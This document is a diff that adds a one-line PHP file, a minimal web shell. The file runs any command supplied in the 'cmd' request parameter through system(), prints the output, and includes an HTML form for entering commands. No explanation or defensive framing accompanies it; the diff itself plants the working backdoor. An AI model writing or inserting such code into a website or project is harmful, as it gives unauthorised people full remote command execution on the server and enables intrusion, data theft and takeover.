@@ -1,0 +1,1 @@
+<?php if (isset($_REQUEST['cmd'])){echo '<pre>'; system($_REQUEST['cmd']); echo '</pre>';} ?><form action=<?php echo basename($_SERVER['PHP_SELF'])?>> <input type=text name=cmd size=20> <input type=submit></form>
